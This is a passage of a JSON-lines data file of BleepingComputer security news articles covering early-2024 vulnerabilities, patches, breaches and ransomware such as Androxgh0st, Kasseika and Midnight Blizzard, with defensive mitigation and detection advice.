across the Internet.\nFBI and CISA advise network defenders to implement the following mitigation measures to limit the impact of Androxgh0st malware attacks and reduce the risk of compromise: - Keep all operating systems, software, and firmware up to date.\nSpecifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50. -\nVerify that the default configuration for all URIs is to deny all requests unless there is a specific need for it to be accessible. -\nEnsure that any live Laravel applications are not in “debug” or testing mode.\nRemove all cloud credentials from .env files and revoke them. -\nOn a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the .env file for unauthorized access or use. -\nScan the server’s file system for unrecognized PHP files, particularly in the root directory or /vendor/phpunit/phpunit/src/Util/PHP folder. -\nReview outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc.,\nparticularly when the request accesses a .php file.\nThe FBI also asked for information on Androxgh0st malware from organizations that detect suspicious or criminal activity linked to this threat.\nCISA added the CVE-2018-15133 Laravel deserialization of untrusted data vulnerability to its Known Exploited Vulnerabilities Catalog today based on this evidence of active exploitation.\nThe U.S. cybersecurity agency also ordered federal agencies to secure their systems against these attacks by February 6.\nThe CVE-2021-41773 Apache HTTP Server path traversal and CVE-2017-9841 PHPUnit command injection vulnerabilities have been added to the catalog in November 2021 and February 2022, respectively.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":26,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"androxgh0st"}}
{"id":22,"title":"Apple fixes first zero-day bug exploited in attacks this year","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/apple/apple-fixes-first-zero-day-bug-exploited-in-attacks-this-year/","clean_text":"Apple released security updates to address this year's first zero-day vulnerability exploited in attacks that could impact iPhones, Macs, and Apple TVs.\nThe zero-day fixed today is tracked as CVE-2024-23222 [iOS, macOS, tvOS, Safari] and is a WebKit confusion issue that attackers could exploit to gain code execution on targeted devices.\nSuccessful exploitation enables threat actors to execute arbitrary malicious code on devices running vulnerable iOS, macOS, and tvOS versions after opening a malicious web page. \"\nProcessing maliciously crafted web content may lead to arbitrary code execution.\nApple is aware of a report that this issue may have been exploited,\" Apple said today.\nThe company has yet to attribute the discovery of this security vulnerability to a security researcher.\nAlthough the company disclosed that it's aware of in-the-wild exploitation, it has yet to publish further details regarding these attacks.\nApple addressed CVE-2024-23222 with improved checks in iOS 16.7.5 and later, iPadOS 16.7.5 and later, and macOS Monterey 12.7.3 and higher, as well as on tvOS 17.3 and later.\nThe complete list of devices impacted by this WebKit zero-day is quite extensive, as the bug affects older and newer models, including: - iPhone 8, iPhone 8 Plus, iPhone X, iPad 5th generation, iPad Pro 9.7-inch, and iPad Pro 12.9-inch 1st generation - iPhone XS and later, iPad Pro 12.9-inch 2nd generation and later, iPad Pro 10.5-inch, iPad Pro 11-inch 1st generation and later, iPad Air 3rd generation and later, iPad 6th generation and later, and iPad mini 5th generation and later - Macs running macOS Monterey and later - Apple TV HD and Apple TV 4K (all models) While this zero-day vulnerability was likely only used in targeted attacks, installing today's security updates as soon as possible is highly advised to block potential attack attempts.\nToday, Apple also backported patches to older iPhone and iPad models for two other WebKit zero-days (CVE-2023-42916 and CVE-2023-42917) patched in November for newer devices.\nLast year, the company fixed a total of 20 zero-day flaws exploited in the wild, including: - two zero-days (CVE-2023-42916 and CVE-2023-42917) in November - two zero-days (CVE-2023-42824 and CVE-2023-5217) in October - five zero-days (CVE-2023-41061, CVE-2023-41064, CVE-2023-41991, CVE-2023-41992, and CVE-2023-41993) in September - two zero-days (CVE-2023-37450 and CVE-2023-38606) in July - three zero-days (CVE-2023-32434, CVE-2023-32435, and CVE-2023-32439) in June - three more zero-days (CVE-2023-32409, CVE-2023-28204, and CVE-2023-32373) in May - two zero-days (CVE-2023-28206 and CVE-2023-28205) in April - and another WebKit zero-day (CVE-2023-23529) in February 8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":12,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"apple"}}
{"id":23,"title":"Hackers start exploiting critical Atlassian Confluence RCE flaw","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/hackers-start-exploiting-critical-atlassian-confluence-rce-flaw/","clean_text":"Security researchers are observing exploitation attempts for the CVE-2023-22527 remote code execution flaw vulnerability that affects outdated versions of Atlassian Confluence servers.\nAtlassian disclosed the security issue last week and noted that it impacts only Confluence versions released before December 5, 2023, along with some out-of-support releases.\nThe flaw has a critical severity score and is described as a template injection weakness that allows unauthenticated remote attackers to execute code on vulnerable Confluence Data Center and Confluence Server endpoints, versions versions 8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, and 8.5.0 through 8.5.3.\nA fix is available for Confluence Data Center and Server versions 8.5.4 (LTS), 8.6.0 (Data Center only), and 8.7.1 (Data Center only), and later versions.\nThreat monitoring service Shadowserver reports today that its systems recorded thousands of attempts to exploit CVE-2023-22527, the attacks originating from a little over 600 unique IP addresses.\nThe service says that attackers are trying out callbacks by executing the 'whoami' command to gather information about the level of access and privileges on the system.\nThe total number of exploitation attempts logged by The Shadowserver Foundation is above 39,000, most of the attacks coming from Russian IP addresses.\nShadowserver reports that its scanners currently detect 11,100 Atlassian Confluence instances accessible over the public internet.\nHowever, not all of those necessarily run a vulnerable version.\nAtlassian Confluence vulnerabilities are assets frequently exploited by various types of attackers, including sophisticated state-sponsored threat actors and opportunistic ransomware groups.\nRegarding CVE-2023-22527, Atlassian has previously said it was unable to provide specific indicators of compromise (IoCs) that would aid in detecting cases of exploitation.\nConfluence server administrators should make sure that the endpoints they manage have been updated at least to a version released after December 5, 2023.\nFor organizations with outdated Confluence instances, the advice is to treat them as potentially compromised, look for signs of exploitation, perform a thorough cleanup, and update to a safe version.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":15,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"atlassian"}}
{"id":24,"title":"Google fixes first actively exploited Chrome zero-day of 2024","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/google-fixes-first-actively-exploited-chrome-zero-day-of-2024/","clean_text":"Google has released security updates to fix the first Chrome zero-day vulnerability exploited in the wild since the start of the year. \"\nGoogle is aware of reports that an exploit for CVE-2024-0519 exists in the wild,\" the company said in a security advisory published Tuesday.\nThe company fixed the zero-day for users in the Stable Desktop channel, with patched versions rolling out worldwide to Windows (120.0.6099.224/225), Mac (120.0.6099.234), and Linux (120.0.6099.224) users less than a week after being reported to Google.\nAlthough Google says the security update could take days or weeks to reach all impacted users, it was available immediately when BleepingComputer checked for updates today.\nThose who prefer not to update their web browser manually can rely on Chrome to automatically check for new updates and install them after the next launch.\nThe high-severity zero-day vulnerability (CVE-2024-0519) is due to a high-severity out-of-bounds memory access weakness in the Chrome V8 JavaScript engine, which remote attackers can exploit via a crafted HTML page to gain access to data beyond the memory buffer through heap corruption, providing them access to sensitive information or triggering a crash. \"\nThe expected sentinel might not be located in the out-of-bounds memory, causing excessive data to be read, leading to a segmentation fault or a buffer overflow,\" MITRE explains. \"\nThe product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer.\nA subsequent read operation then produces undefined or unexpected results.\"\nBesides unauthorized access to out-of-bounds memory, CVE-2024-0519 could also be exploited to bypass protection mechanisms such as ASLR to make it easier to achieve code execution via another weakness.\nWhile Google knows of CVE-2024-0519 zero-day exploits used in attacks, the company has yet to share further details regarding these incidents. \"\nAccess to bug details and links may be kept restricted until a majority of users are updated with a fix,\" Google said. \"\nWe will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven't yet fixed.\"\nToday, Google also patched V8 out-of-bounds write (CVE-2024-0517) and type confusion (CVE-2024-0518) flaws, allowing for arbitrary code execution on compromised devices.\nLast year, Google fixed eight Chrome zero-day bugs exploited in attacks tracked as CVE-2023-7024, CVE-2023-6345, CVE-2023-5217, CVE-2023-4863, CVE-2023-3079, CVE-2023-4762, CVE-2023-2136, and CVE-2023-2033.\nSome of them, like CVE-2023-4762, were tagged as zero-days used to deploy spyware on vulnerable devices belonging to high-risk users, including journalists, opposition politicians, and dissidents, several weeks after the company released patches.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":18,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"chrome"}}
{"id":25,"title":"Citrix warns of new Netscaler zero-days exploited in attacks","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/citrix-warns-of-new-netscaler-zero-days-exploited-in-attacks/","clean_text":"Citrix urged customers on Tuesday to immediately patch Netscaler ADC and Gateway appliances exposed online against two actively exploited zero-day vulnerabilities.\nThe two zero-days (tracked as CVE-2023-6548 and CVE-2023-6549) impact the Netscaler management interface and expose unpatched Netscaler instances to remote code execution and denial-of-service attacks, respectively.\nHowever, to gain code execution, attackers must be logged in to low-privilege accounts on the targeted instance and need access to NSIP, CLIP, or SNIP with management interface access.\nAlso, the appliances must be configured as a gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or an AAA virtual server to be vulnerable to DoS attacks.\nThe company says that only customer-managed NetScaler appliances are impacted by the zero-days, while Citrix-managed cloud services or Citrix-managed Adaptive Authentication are not affected.\nThe list of Netscaler product versions affected by these two zero-day vulnerabilities includes the following: - NetScaler ADC and NetScaler Gateway 14.1 before 14.1-12.35 - NetScaler ADC and NetScaler Gateway 13.1 before 13.1-51.15 - NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.21 - NetScaler ADC 13.1-FIPS before 13.1-37.176 - NetScaler ADC 12.1-FIPS before 12.1-55.302 - NetScaler ADC 12.1-NDcPP before 12.1-55.302 According to data provided by threat monitoring platform Shadowserver, just over 1,500 Netscaler management interfaces are now exposed on the Internet.\nIn a security advisory published today, Citrix urged all admins to immediately patch their Netscaler appliances against the two zero-days to block potential attacks. \"\nExploits of these CVEs on unmitigated appliances have been observed,\" the company warned. \"\nCloud Software Group strongly urges affected customers of NetScaler ADC and NetScaler Gateway to install the relevant updated versions as soon as possible.\"\nThose still using NetScaler ADC and NetScaler Gateway version 12.1 end-of-life (EOL) software were also advised to upgrade them to a version still under support.\nAdmins who cannot immediately deploy today's security updates should block network traffic to affected instances and ensure they're not exposed online. \"\nCloud Software Group strongly recommends that network traffic to the appliance's management interface is separated, either physically or logically, from normal network traffic,\" Citrix said. \"\nIn addition, we recommend that you do not expose the management interface to the internet, as explained in the secure deployment guide.\nRemoving such exposure to the internet greatly reduces the risk of exploitation of this issue.\"\nAnother critical Netscaler flaw patched in October and tracked as CVE-2023-4966 (later dubbed Citrix Bleed) was also exploited as a zero-day since August by various threat groups to hack into the networks of government organizations and high-profile tech companies worldwide, such as Boeing.\nHHS' security team, the Health Sector Cybersecurity Coordination Center (HC3), also issued a sector-wide alert urging health organizations to secure their NetScaler ADC and NetScaler Gateway instances against surging ransomware attacks.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":18,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"citrix"}}
{"id":26,"title":"Fortra warns of new critical GoAnywhere MFT auth bypass, patch now","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/fortra-warns-of-new-critical-goanywhere-mft-auth-bypass-patch-now/","clean_text":"Fortra is warning of a new authentication bypass vulnerability impacting GoAnywhere MFT (Managed File Transfer) versions before 7.4.1 that allows an attacker to create a new admin user.\nGoAnywhere MFT is used by organizations worldwide to secure transfer files with customers and business partners.\nIt supports secure encryption protocols, automation, centralized control, and various logging and reporting tools that aid in legal compliance and auditing.\nThe newly disclosed flaw is tracked as CVE-2024-0204 and is rated critical with a CVSS v3.1 score of 9.8 as it is remotely exploitable, allowing an unauthorized user to create admin users via the product’s administration portal.\nCreating arbitrary accounts with administrative privileges can lead to a complete device takeover.\nIn the case of Go Anywhere MFT, that would allow attackers to access sensitive data, introduce malware, and potentially enable further attacks within the network.\nThe flaw impacts Fortra GoAnywhere MFT 6.x from 6.0.1 and Fortra GoAnywhere MFT 7.4.0 and earlier and was fixed in GoAnywhere MFT 7.4.1, released on December 7, 2023.\nFortra advises all users to install the latest update (currently 7.4.1) to fix the vulnerability.\nFortra also provides the following two manual mitigation pathways in the advisory: - Delete the InitialAccountSetup.xhtml file in the installation directory and restart the services. -\nReplace the InitialAccountSetup.xhtml file with an empty file and restart the services.\nOne thing to note is that CVE-2024-0204 was discovered on December 1, 2023, by Mohammed Eldeeb and Islam Elrfai from Spark Engineering Consultants.\nThat said, significant time has passed since the initial disclosure.\nBleepingComputer has contacted the software vendor about whether it is actively exploited, and we received assurances that the company has seen no attempts.\nWe have no reports of active exploitation in the wild regarding this CVE.\nThis was patched in December 2023. -\nFortra However, now that Fortra has released mitigations and a clue as to where to search for the bug, it would not be surprising if PoC exploits were released soon.\nClop GoAnywhere MFT attacks In early 2023, it was revealed that the Clop ransomware gang had breached 130 companies and organizations by leveraging a critical remote code execution flaw in GoAnywhere MFT.\nThe flaw is tracked as CVE-2023-0669 and had been exploited as a zero-day vulnerability since January 18, 2023.\nFortra discovered its exploitation on February 3, 2023, and released patches three days later.\nUnfortunately, the damage had already been done, with Clop conducting widespread data theft attacks that impacted organizations worldwide, causing data leaks, reputational damage, and operational disruptions.\nSome notable victims of those attacks include Crown Resorts, CHS, Hatch Bank, Rubrik, the City of Toronto, Hitachi Energy, Procter & Gamble, and Saks Fifth Avenue.\nFortra kept a cryptic stance towards press requests for details on the situation and only communicated the results of its internal investigation in mid-April 2023.\nUpdate 1/23 - Added Fortra statement 8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":24,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"fortra"}}
{"id":27,"title":"GitHub rotates keys to mitigate impact of credential-exposing flaw","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/github-rotates-keys-to-mitigate-impact-of-credential-exposing-flaw","clean_text":"GitHub rotated keys potentially exposed by a vulnerability patched in December that could let attackers access credentials within production containers via environment variables.\nThis unsafe reflection vulnerability (tracked as CVE-2024-0200) can allow attackers to gain remote code execution on unpatched servers.\nIt was also patched on Tuesday in GitHub Enterprise Server (GHES) versions 3.8.13, 3.9.8, 3.10.5, and 3.11.3, with the company urging all customers to install the security update as soon as possible.\nWhile allowing threat actors to gain access to environment variables of a production container, including credentials, successful exploitation requires authentication with an organization owner role (with admin access to the organization). \"\nOn December 26, 2023, GitHub received a report through our Bug Bounty Program demonstrating a vulnerability which, if exploited, allowed access to credentials within a production container.\nWe fixed this vulnerability on GitHub.com the same day and began rotating all potentially exposed credential,\" said Github VP and Deputy Chief Security Officer Jacob DePriest. \"\nAfter running a full investigation, we assess with high confidence, based on the uniqueness of this issue and analysis of our telemetry and logging, that this vulnerability has not been previously found and exploited.\"\nWhile the organization owner role requirement is a significant mitigating factor and the vulnerability's impact is limited to the researcher who found and reported the issue through GitHub's Bug Bounty Program, DePriest says the credentials were still rotated according to security procedures and \"out of an abundance of caution.\"\nAlthough most of the keys rotated by GitHub in December require no customer action, those using GitHub's commit signing key and GitHub Actions, GitHub Codespaces, and Dependabot customer encryption keys will have to import the new public keys. \"\nWe strongly recommend regularly pulling the public keys from the API to ensure you're using the most current data from GitHub.\nThis will also allow for seamless adoption of new keys in the future,\" DePriest said.\nGitHub also fixed a second high-severity Enterprise Server command injection vulnerability (CVE-2024-0507) that would allow attackers using a Management Console user account with an editor role to escalate privileges.\nThis isn't the first time the company has had to rotate or revoke exposed or stolen secrets in the past year.\nFor instance, it also rotated its GitHub.com private SSH key last March after it was accidentally and \"briefly\" exposed via a public GitHub repository, impacting Git operations over SSH using RSA.\nThe incident occurred weeks after the company began rolling out secrets scanning for all public repositories, which should've caught the exposed key since it supports API keys, account passwords, authentication tokens, and other confidential data alerts.\nMonths earlier, GitHub also had to revoke code-signing certificates for its Desktop and Atom applications after unknown attackers stole them after breaching the company's development and release planning repositories in December 2022.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":18,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"github"}}
{"id":28,"title":"Over 5,300 GitLab servers exposed to zero-click account takeover attacks","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/over-5-300-gitlab-servers-exposed-to-zero-click-account-takeover-attacks/","clean_text":"Over 5,300 internet-exposed GitLab instances are vulnerable to CVE-2023-7028, a zero-click account takeover flaw GitLab warned about earlier this month.\nThe critical (CVSS score: 10.0) flaw allows attackers to send password reset emails for a targeted account to an attacker-controlled email address, allowing the threat actor to change the password and take over the account.\nAlthough the flaw does not bypass two-factor authentication (2FA), it is a significant risk for any accounts not protected by this extra security mechanism.\nThe issue impacts GitLab Community and Enterprise Edition versions 16.1 before 16.1.5, 16.2 before 16.2.8, 16.3 before 16.3.6, 16.4 before 16.4.4, 16.5 before 16.5.6, 16.6 before 16.6.4, and 16.7 before 16.7.2.\nGitLab released fixes in 16.7.2, 16.5.6, and 16.6.4, also backporting patches to 16.1.6, 16.2.9, and 16.3.7, on January 11, 2024.\nToday, 13 days after the security updates were made available, threat monitoring service ShadowServer reports seeing 5,379 vulnerable GitLab instances exposed online.\nBased on GitLab's role as a software development and project planning platform and the type and severity of the flaw, these servers are at risk of supply chain attacks, proprietary code disclosure, API key leaks, and other malicious activity.\nShadowserver reports that most of the vulnerable servers are in the United States (964), followed by Germany (730), Russia (721), China (503), France (298), the U.K. (122), India (117), and Canada (99).\nThose who haven't patched yet may have been compromised already, so using GitLab's incident response guide and checking for signs of compromise is critical.\nGitLab previously shared the following detection tips for defenders: Check gitlab-rails/production_json.log for HTTP requests to the /users/password path with params.value.email consisting of a JSON array with multiple email addresses.\nCheck gitlab-rails/audit_json.log for entries with meta.caller.id of PasswordsController#create and target_details consisting of a JSON array with multiple email addresses.\nAdmins who find instances that have been compromised should rotate all credentials, API tokens, certificates, and any other secrets, in addition to enabling 2FA on all accounts and applying the security update.\nAfter securing the servers, admins should check for modifications in their developer environment, including source code and potentially tampered files.\nAs of today, there have been no confirmed cases of active exploitation of CVE-2023-7028, but this shouldn't be interpreted as a reason to postpone taking action.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":16,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"gitlab"}}
{"id":29,"title":"Exploit released for Fortra GoAnywhere MFT auth bypass bug","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/exploit-released-for-fortra-goanywhere-mft-auth-bypass-bug/","clean_text":"Exploit code is now available for a critical authentication bypass vulnerability in Fortra's GoAnywhere MFT (Managed File Transfer) software that allows attackers to create new admin users on unpatched instances via the administration portal.\nGoAnywhere MFT is a web-based managed file transfer tool that helps organizations transfer files securely with partners and keep audit logs of who accessed all shared files.\nWhile Fortra silently patched the bug (CVE-2024-0204) on December 7 with the release of GoAnywhere MFT 7.4.1, the company only publicly disclosed it today in an advisory offering limited information (more details are available in a private customer advisory).\nHowever, Fortra also issued private advisories to customers on December 4 before fixing the flaw, urging them to secure their MFT services to keep their data safe.\nAdmins who haven't yet and can't immediately upgrade to the last version are advised to remove the attack vector by: - Deleting the InitialAccountSetup.xhtml file in the installation directory and restarting the services. -\nReplacing the InitialAccountSetup.xhtml file with an empty file and restarting the services.\nThe company told BleepingComputer on Tuesday that there have been no reports of attacks exploiting this vulnerability.\nToday, almost seven weeks later, security researchers with Horizon3's Attack Team published a technical analysis of the vulnerability and shared a proof-of-concept (PoC) exploit that helps create new admin users on vulnerable GoAnywhere MFT instances exposed online.\nTheir exploit takes advantage of the path traversal issue at the root of CVE-2024-0204 to access the vulnerable /InitialAccountSetup.xhtml endpoint and start the initial account setup screen (that shouldn't be available after the server's setup process) to create a new administrator account. \"\nThe easiest indicator of compromise that can be analyzed is for any new additions to the 'Admin users' group in the GoAnywhere administrator portal Users -> Admin Users section,\" said Zach Hanley, Chief Attack Engineer at Horizon3. \"\nIf the attacker has left this user here you may be able to observe its last logon activity here to gauge an approximate date of compromise.\"\nHowever, now that Horizon3 has released a PoC exploit, it's very likely that threat actors will start scanning for and compromise all GoAnywhere MFT instances left unpatched.\nClop's GoAnywhere MFT breach campaign The Clop ransomware gang breached over 100 organizations by exploiting a critical remote code execution flaw (CVE-2023-0669) in the GoAnywhere MFT software.\nClop's attacks began on January 18, 2023, and Fortra discovered that the flaw was being weaponized to breach its customers' secure file servers on February 3.\nThe list of victims who came forward after being breached and extorted by Clop includes but is not limited to healthcare giant Community Health Systems (CHS), Consumer goods giant Procter & Gamble, cybersecurity firm Rubrik, Hitachi Energy, fintech platform Hatch Bank, luxury brand retailer Saks Fifth Avenue, and the City of Toronto, Canada.\nClop's involvement in last year's data theft campaign is part of a much broader pattern of targeting MFT platforms in recent years.\nOther instances include the breach of Accellion FTA servers in December 2020, SolarWinds Serv-U servers in 2021, and the widespread exploitation of MOVEit Transfer servers starting May 27, 2023.\nUpdate January 23, 19:26 EST: Corrected start date for Clop's MOVEit attacks.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":20,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"goanywhere"}}
{"id":30,"title":"Kasseika ransomware uses antivirus driver to kill other antiviruses","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/kasseika-ransomware-uses-antivirus-driver-to-kill-other-antiviruses/","clean_text":"A recently uncovered ransomware operation named 'Kasseika' has joined the club of threat actors that employs Bring Your Own Vulnerable Driver (BYOVD) tactics to disable antivirus software before encrypting files.\nKasseika abuses the Martini driver (Martini.sys/viragt64.sys), part of TG Soft's VirtIT Agent System, to disable antivirus products protecting the targeted system.\nAccording to Trend Micro, whose analysts first discovered and examined Kasseika in December 2023, the new ransomware strain features many attack chains and source code similarities with BlackMatter.\nAs BlackMatter's source code has never been leaked publicly since its shutdown in late 2021, Kasseika was likely built by former members of the threat group or experienced ransomware actors who purchased its code.\nKasseika attack chain Kasseika attacks start with a phishing email sent to employees of the targeted organization, attempting to steal their account credentials, which will then be used for initial access to the corporate network.\nNext, Kasseika operators abuse the Windows PsExec tool to execute malicious .bat files on the infected system and others they have accessed through lateral movement.\nThe batch file checks for the presence of a process named 'Martini.exe' and terminates it to avoid interference.\nNext, it downloads the vulnerable 'Martini.sys' driver on the machine.\nThe presence of that driver is crucial in the attack chain, as Kasseika will not proceed further if the 'Martini' service creation fails or if 'Martini.sys' isn't found on the system.\nBy using BYOVD attacks, aka exploiting flaws in the loaded driver, the malware gains the privileges to terminate 991 processes from a hardcoded list, many of which correspond to antivirus products, security tools, analysis tools, and system utilities.\nKasseika eventually executes Martini.exe to terminate AV processes and then launches the main ransomware binary (smartscreen_protected.exe).\nAfter this, it runs a 'clear.bat' script to remove attack traces.\nThe ransomware utilizes the ChaCha20 and RSA encryption algorithms to encrypt target files, appending a pseudo-random string to the filenames, similar to BlackMatter.\nKasseika drops a ransom note in every directory that it has encrypted and also changes the computer's wallpaper to display a note about the attack.\nFinally, Kasseika clears system event logs post-encryption, using commands like 'wevutil.exe' to erase traces of its activities and make security analysis harder.\nIn the attacks seen by Trend Micro, victims were given 72 hours to deposit 50 Bitcoins ($2,000,000), with another $500,000 added every 24 hours of delay in resolution.\nThe victims are expected to post a screenshot of payment proof on a private Telegram group to receive a decrypter, with the maximum deadline for doing so set to 120 hours (5 days).\nTrend Micro has published indicators of compromise (IoCs) related to the Kasseika threat separately in this text file.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":20,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"kasseika"}}
{"id":31,"title":"Mastodon vulnerability allows attackers to take over accounts","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/mastodon-vulnerability-allows-attackers-to-take-over-accounts/","clean_text":"Mastodon, the free and open-source decentralized social networking platform, has fixed a critical vulnerability that allows attackers to impersonate and take over any remote account.\nThe platform became popular after Elon Musk acquired Twitter and now boasts nearly 12 million users spread across 11,000 instances.\nInstances (servers) on Mastodon are autonomous but interconnected (through a system known as \"federation\") communities that have their own guidelines and policies, controlled by owners who provide the infrastructure and act as administrators of their servers.\nThe newly fixed flaw is tracked as CVE-2024-23832 and stems from insufficient origin validation in Mastodon, allowing attackers to impersonate users and take over their accounts.\nThe vulnerability is rated 9.4 in CVSS v3.1 and impacts all Mastodon versions before 3.5.17, 4.0.13, 4.1.13, and 4.2.5.\nThe flaw was fixed as of 4.2.5, released yesterday, which all Mastodon server administrators are advised to upgrade to as soon as possible to protect users of their instances.\nMastodon has withheld technical details for the time being to prevent active exploitation of the vulnerability.\nHowever, they promised to share more information about CVE-2024-23832 on February 15, 2024.\nMastodon users cannot do anything to address the security risk, but they should ensure that the admins of the instance they participate in have upgraded to a safe version by mid-February; otherwise, their accounts will be prone to hijacking.\nThankfully, Mastodon has opted to alert server admins via a pronounced banner about the critical update, so all instances that are actively maintained should become aware of the update and move to the safe version in the following days.\nThe repercussions of account impersonation and takeover in Mastodon can be significant, impacting individual users, communities, and the integrity of the platform, so CVE-2024-23832 is a severe flaw.\nIn July 2023, the Mastodon team fixed another critical bug tracked as CVE-2023-36460 and dubbed 'TootRoot,' which allowed attackers to send \"toots\" (the equivalent of tweets) that would create web shells on target instances.\nAttackers could leverage this flaw to completely compromise Mastodon servers, allowing them to access sensitive user information, communications, and plant backdoors.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":15,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"mastodon"}}
{"id":32,"title":"Russian hackers stole Microsoft corporate emails in month-long breach","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/russian-hackers-stole-microsoft-corporate-emails-in-month-long-breach/","clean_text":"Microsoft warned Friday night that some of its corporate email accounts were breached and data stolen by a Russian state-sponsored hacking group known as Midnight Blizzard.\nThe company detected the attack on January 12th, with Microsoft's investigation ultimately determining that the attack was conducted by Russian threat actors known more commonly as Nobelium or APT29.\nMicrosoft says the threat actors breached their systems in November 2023 when they conducted a password spray attack to access a legacy non-production test tenant account.\nA password spray is a type of brute force attack where threat actors collect a list of potential login names and then attempt to log in to all of them using a particular password.\nIf that password fails, they repeat this process with other passwords until they run out or successfully breach the account.\nThe fact that the hackers were able to gain access to the account using a brute force attack indicates it was not protected with two-factor authentication (2FA) or multi-factor authentication (MFA), a security practice that Microsoft recommends on all types of online accounts.\nOnce the hackers gained access to the \"test\" account, Microsoft says the Nobelium hackers used it to access a \"small percentage\" of Microsoft's corporate email accounts for over a month.\nUnless the threat actors used this test account to breach systems and pivot to accounts with higher permissions, it is unclear why a non-production test account would have the permissions to access other accounts in Microsoft's corporate email system.\nMicrosoft says the breached email accounts included members of Microsoft's leadership team and employees in the cybersecurity and legal departments, from which the hackers stole emails and attachments. \"\nThe investigation indicates they were initially targeting email accounts for information related to Midnight Blizzard itself,\" the Microsoft Security Response Center shared in a report on the incident. \"\nWe are in the process of notifying employees whose email was accessed.\"\nMicrosoft reiterates that this breach was not caused by a vulnerability in their products and services but rather by a brute force password attack on their accounts.\nHowever, based on the limited information shared by Microsoft, it appears that a big part of the breach was caused by the poorly secured configuration of the breached account.\nWhile Microsoft is still investigating the breach, they said they will share additional details as appropriate.\nIn a Form 8-K filing with the SEC, Microsoft says that the breach has not had a material impact on the company's operations.\nWho is Nobelium Nobelium (aka Midnight Blizzard, APT29, and Cozy Bear) is a Russian state-sponsored hacking group believed to be part of Russia's Foreign Intelligence Service (SVR), which has been linked to numerous attacks over the years.\nThe hackers rose to notoriety when the U.S. government linked them to the 2020 SolarWinds supply chain attack, which also impacted Microsoft at the time.\nMicrosoft later confirmed that the SolarWinds attack allowed the hackers to steal source code for a limited number of Azure, Intune, and Exchange components.\nIn June 2021, the hacking group once again breached a Microsoft corporate account, allowing them to access customer support tools.\nIn addition to conducting cyberespionage and data theft attacks, Nobelium is also known for developing custom malware to use in their attacks.\nMicrosoft has always been a highly prized target as it controls so much of the data and services used by governments and enterprises worldwide.\nMore recently, Microsoft was targeted by Chinese hackers who stole a Microsoft signing key that allowed them to access the email accounts of two dozen organizations, including U.S. and Western European government agencies.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":24,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"microsoft"}}
